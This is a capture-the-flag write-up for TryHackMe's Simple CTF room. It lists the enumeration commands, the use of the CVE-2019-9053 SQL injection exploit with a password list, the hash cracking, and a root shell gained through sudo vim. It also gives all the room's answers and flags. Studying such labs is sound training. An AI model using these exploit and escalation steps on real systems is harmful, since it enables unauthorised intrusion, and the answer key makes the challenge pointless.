## Simple CTF - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/easyctf)

**Deploy the machine and attempt the questions!**

**HINT 1**: `An issue was discovered in CMS Made Simple 2.2.8. It is possible with the News module, through a crafted URL, to achieve unauthenticated blind time-based SQL injection via the m1_idlist parameter.`

**HINT 2**: `You can use /usr/share/seclists/Passwords/Common-Credentials/best110.txt to crack the pass`

**IP: 10.10.105.220**

---

## 📌 General Information

**Room Difficulty**: Easy <br>

**Room Type**: Linux Privilege Escalation, Password Cracking <br>

**Tools Used**: Nmap, Gobuster, John The Ripper

**Author**: <br>

mauzware aka mauzinho <br>
[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap and Gobuster.
  ```
  nmap -A -p- 10.10.105.220
  
  open ports: 21, 80, 2222
  21 -> vsftpd 3.0.3
  80 -> Apache httpd 2.4.18 ((Ubuntu))
  2222 -> OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

  gobuster dir -u http://10.10.105.220 -w=/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 64 --no-error -z -x php,asp,html,txt,zip
  /robots.txt 
  ```
  
- When I visited `robots.txt` I found `mike` which could be usefull credential. Now moving to exploitation

---

## ⚙️ Exploitation

- So for exploits, I found it with `searchsploit` but you can also download it from Exploits DB with this [link](https://www.exploit-db.com/exploits/46635)

  ```
  searchsploit cms made simple
  searchsploit -m 46635
  ```
  
- I moved to exploit to desired directory and changed it's name to `cmsexploit.py`, now let's run it. Hint told me to use `/usr/share/seclists/Passwords/Common-Credentials/best110.txt` as wordlist.

  ```
  python cmsexploit.py -u http://10.10.105.220/simple/ --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
  ```
  
- Nice! It found credentials `mitch` and `0c01f4468bd75d7a84c7eb73846e8d96`. Crack the hash and use those credential to connect with SSH. Password is `secret`.

  ```
  john --wordlist=/usr/share/seclists/Passwords/Common-Credentials/best110.txt hash.txt
  ```

- Connect with SSH on port 2222: `ssh mithc@10.10.105.220 -p 2222` ; password is `secret`.

---

## 🧍 User Privilege Escalation

- Finding user flag is simple. `G00d j0b, keep up!`

---

## 👑 Root Privilege Escalation

- For root flags, I always look for writable files, SUID and SUDO privileges first. Writable files and SUID weren't helpfull but SUDO was!

  ```
  sudo -l 
  /usr/bin/vim
  ```
  
- So, for getting root with `vim` there's few different options, all 3 of these will work. After getting root, just read the flag.

  ```
  sudo vim -c ':!/bin/sh'
  sudo vim -c '!sh'
  sudo /usr/bin/vim
  
  cat /root/root.txt
  W3ll d0n3. You made it!
  ```

---

## 🏁 Flags

- **How many services are running under port 1000?**: `2`
- **What is running on the higher port?**: `ssh`
- **What's the CVE you're using against the application?**: `CVE-2019-9053`
- **To what kind of vulnerability is the application vulnerable?**: `sqli`
- **What's the password?**: `secret`
- **Where can you login with the details obtained?**: `ssh`
- **User Flag**: `G00d j0b, keep up!`
- **Is there any other user in the home directory? What's its name?**: `sunbath`
- **What can you leverage to spawn a privileged shell?**: `vim`
- **Root Flag**: `W3ll d0n3. You made it!`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing special, just sharpening my skills tho.`

- What did I learn?
  `New CVE and new exploit.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
